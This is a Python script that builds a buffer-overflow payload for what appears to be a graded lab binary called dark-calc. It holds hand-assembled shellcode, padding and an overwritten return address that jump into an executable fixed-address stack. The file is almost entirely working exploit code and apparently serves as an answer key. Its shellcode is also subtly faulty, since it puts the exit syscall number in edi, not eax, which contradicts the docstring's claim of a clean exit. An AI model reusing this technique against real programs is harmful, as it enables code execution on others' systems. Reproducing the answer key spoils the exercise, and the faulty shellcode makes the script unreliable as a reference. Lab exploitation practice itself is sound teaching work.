#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc (stack space execution).

dark-calc's init_fixed_stack() maps a RWX region and switches rsp to it.
Because the stack is at a fixed address, we can place shellcode on the stack
and jump to it by overwriting the saved return address (offset 24 from the
gets buffer). The shellcode sets edi=4, calls grade_eval, then exits cleanly
to avoid hitting the guard page at 0x721000801000.
"""
import struct
import sys

p64 = lambda v: struct.pack("<Q", v)

shellcode = bytes([
    0xBF, 0x04, 0x00, 0x00, 0x00,              # mov edi, 4
    0x48, 0xC7, 0xC0, 0x87, 0x1A, 0x40, 0x00,  # mov rax, 0x401A87 (grade_eval)
    0xFF, 0xD0,                                # call rax
    0xBF, 0x3C, 0x00, 0x00, 0x00,              # mov edi, 60
    0x0F, 0x05,                                # syscall (exit)
])

BUFFER_ADDR = 0x721000800FD0

payload = shellcode + b"\x90" * (24 - len(shellcode)) + p64(BUFFER_ADDR)

sys.stdout.buffer.write(payload)
